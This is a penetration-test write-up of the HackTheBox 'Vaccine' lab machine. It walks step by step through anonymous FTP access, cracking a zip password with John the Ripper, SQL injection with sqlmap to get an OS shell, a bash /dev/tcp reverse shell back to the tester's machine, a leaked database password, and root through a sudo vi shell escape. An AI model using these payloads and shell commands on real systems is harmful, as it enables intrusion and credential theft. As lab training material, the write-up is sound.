# Pentest raport for Vaccine box

### CVSS Base Score: 9.8 (Critical)

### CWE-521: Weak Password Requirements

### CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

### CWE-285: Improper Authorization 

### CWE-732: Incorrect Permission Assignment for Critical Resource

Description: In this penetration test report, we uncover critical vulnerabilities  within the Vaccine machine's security infrastructure. Despite data  encryption, we were able to easily crack weak passwords to access  sensitive information, which we subsequently encrypted. By exploiting  SQL injection, we established a shell on the victim machine and  identified misconfigured permissions, ultimately gaining root  privileges.

###### POC :

Begin the penetration test by conducting initial scans on the target system.

```bas

┌─[parrot@parrot]─[~]
└──╼ $nmap -sC -sV 10.129.59.35
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-23 18:25 BST
Nmap scan report for 10.129.59.35
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.59
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0ee58077534b00b9165b259569527a4 (RSA)
|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)
|_  256 425bc321dfefa20bc95e03421d69d028 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```

We can see an open SSH port, but we don't have the login credentials.  Next, we notice an open HTTP port, and we intend to visit the site  hosted on that port.



![](/home/dodo/Documents/HTB/HTB_lab/HTB_labs/.Vaccine_img/login.png)

We can see that the login form has no SQL injection errors, so we are  going to check the third open port, FTP, to examine some valuable data.

We log in to the FTP client with an anonymous user

``` bash

┌─[parrot@parrot]─[~]
└──╼ $ftp 10.129.59.35
Connected to 10.129.59.35.
220 (vsFTPd 3.0.3)
Name (10.129.59.35:parrot): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
```



We can see a file named 'backup.zip' within, and there's a possibility  that we might find something interesting in it, so we download it.

```bash
ftp> get backup.zip
local: backup.zip remote: backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 0.00 secs (34.5094 MB/s)
ftp> exit 
221 Goodbye.
```

Unfortunately, the file is encoded, and we don't have a password. 

```bash
┌─[parrot@parrot]─[~]
└──╼ $unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
```

Due to that, we are going to use the brute force tool "John the Ripper" to obtain the password.



```bash
┌─[parrot@parrot]─[~]
└──╼ $zip2john backup.zip -o hashes
Using file hashes as only file to check
┌─[parrot@parrot]─[~]
└──╼ $cat hashes 
backup.zip:$pkzip2$2*2*1*0*8*24*3a41*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*1b1c*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip2$::backup.zip:style.css, index.php:backup.zip
┌─[parrot@parrot]─[~]
└──╼ $john hashes 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
741852963        (backup.zip)
1g 0:00:00:00 DONE 2/3 (2023-10-23 18:05) 14.28g/s 1086Kp/s 1086Kc/s 1086KC/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```



```bash
┌─[parrot@parrot]─[~]
└──╼ $unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css    
```

Now that we have the password, we can research the files "index.php" and "style.css" for valuable information.



```bash
  
  ┌─[parrot@parrot]─[~]
└──╼ $cat index.php 
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>MegaCorp Login</title>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">

</head>
  <h1 align=center>MegaCorp Login</h1>
<body>
<!-- partial:index.partial.html -->
<body class="align">

  <div class="grid">

    <form action="" method="POST" class="form login">

      <div class="form__field">
        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
      </div>

      <div class="form__field">
        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
      </div>

      <div class="form__field">
        <input type="submit" value="Sign In">
      </div>

    </form>


  </div>

  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>

</body>
<!-- partial -->
  
</body>
</html>
```

We observe an MD5-encrypted password for the user "admin" `(['password']) === "2cb42f8734ea607eefed3b70af13bbd3")`. Therefore, we can attempt to  decrypt it and log in as the admin.

![](/.Vaccine_img/passw.png)



After login 

![](/.Vaccine_img/admin.png)



We can see that the search functionality is vulnerable to SQL injection attacks.



![](/.Vaccine_img/search.png)



Now, we're going to use the tool "sqlmap" to obtain an OS shell. To do this, we'll copy the cookie file by using Burp Suite.



```bash
GET /dashboard.php?search=ls HTTP/1.1
Host: 10.129.145.225
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.145.225/dashboard.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=pkuln36ngjrl42iai6jspmgs9k
Connection: close
```



```bash
┌─[parrot@parrot]─[~]
└──╼ $sqlmap -u http://10.129.59.35/dashboard.php?search=lo  --cookie="PHPSESSID=gsjasp3t6tbfug9r42b484tif3" --os-shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:08:29 /2023-10-23/

[19:08:29] [INFO] resuming back-end DBMS 'postgresql' 
[19:08:29] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=lo' AND (SELECT (CASE WHEN (7034=7034) THEN NULL ELSE CAST((CHR(111)||CHR(78)||CHR(84)||CHR(110)) AS NUMERIC) END)) IS NULL-- ifOx

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=lo' AND 7819=CAST((CHR(113)||CHR(122)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (7819=7819) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC)-- ftoN

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=lo';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=lo' AND 9787=(SELECT 9787 FROM PG_SLEEP(5))-- yefI
---
[19:08:30] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[19:08:30] [INFO] fingerprinting the back-end DBMS operating system
[19:08:30] [INFO] the back-end DBMS operating system is Linux
[19:08:31] [INFO] testing if current user is DBA
[19:08:31] [INFO] retrieved: '1'
[19:08:31] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[19:08:31] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
[19:12:07] [INFO] retrieved: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)'
command standard output: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)'
os-shell> 
```



However, the shell obtained is very unstable and not functional. Therefore, we're going to spawn another reverse shell.



Let's set up a listener port.

```bash 
┌─[✗]─[parrot@parrot]─[~]
└──╼ $sudo nc -lvnp 443
[sudo] password for parrot: 
listening on [any] 443 ...
```

Now spawn a reverse shell.

```bash
os-shell> bash -c "bash -i >& /dev/tcp/{MY ADRESS IP }/443 0>&1"
```

```bash
┌─[✗]─[parrot@parrot]─[~]
└──╼ $sudo nc -lvnp 443
[sudo] password for parrot: 
listening on [any] 443 ...
connect to [MY ADRESS IP] from (UNKNOWN) [10.129.59.35] 32840
bash: cannot set terminal process group (5641): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ 
```

Now, let's make it more functional.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
postgres@vaccine:~$
```

Now it's time for privilege escalation. For that, we're going to check  which scripts we are able to execute with root privileges.

```bash
postgres@vaccine:~$ sudo -l
[sudo] password for postgres:
```

For now, we don't have a password for the user 'postgres,' so we're  going to search the configuration files inside dir html to check if there is  another way

```bash
postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
postgres@vaccine:/var/www/html$ ls -la
total 392
drwxr-xr-x 2 root root 4096 Jul 23 14:00 .
drwxr-xr-x 3 root root 4096 Jul 23 14:00 ..
-rw-rw-r-- 1 root root 362847 Feb 3 2020 bg.png
-rw-r--r-- 1 root root 4723 Feb 3 2020 dashboard.css
-rw-r--r-- 1 root root 50 Jan 30 2020 dashboard.js
-rw-r--r-- 1 root root 2313 Feb 4 2020 dashboard.php
-rw-r--r-- 1 root root 2594 Feb 3 2020 index.php
-rw-r--r-- 1 root root 1100 Jan 30 2020 license.txt
-rw-r--r-- 1 root root 3274 Feb 3 2020 style.css
postgres@vaccine:/var/www/html$cat dashboard.php

session_start();
if($_SESSION['login'] !== "true") {
header("Location: index.php");
die();
}
try {
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres
password=P@s5w0rd!");
}

```

We got it .

Now that we have the password for the 'postgres' user, for convenience,  we're going to log in via SSH and again check the scripts.



``` bash
┌─[✗]─[parrot@parrot]─[~]
└──╼ $ssh postgres@10.129.145.225
postgres@10.129.145.225's password: 

postgres@vaccine:~$ 
postgres@vaccine:~$ sudo -l
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

We see that the file "/etc/postgresql/11/main/pg_hba.conf" can be opened with "vi" using root privileges.

So, we are investigating how to utilize this.

![](/.Vaccine_img/shell.png)

We trying this.

```bash 
postgres@vaccine:~$ sudo  /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null
[sudo] password for postgres: 
Sorry, user postgres is not allowed to execute '/bin/vi /etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh /dev/null' as root on vaccine.
postgres@vaccine:~$ 
```

Unfortunately, the "postgres" user does not have the privileges to  execute it in that way. However, there is another method, and we are  going to attempt that as well.

```bash
postgres@vaccine:~$ sudo  /bin/vi /etc/postgresql/11/main/pg_hba.conf
:set shell-/bin/sh
:shell


# id
uid=0(root) gid=0(root) groups=0(root)
# 

# cat root.txt
dd6e058e814260bc70e9bbdef2715849
```

Now, we have gained access to the root and user flags.
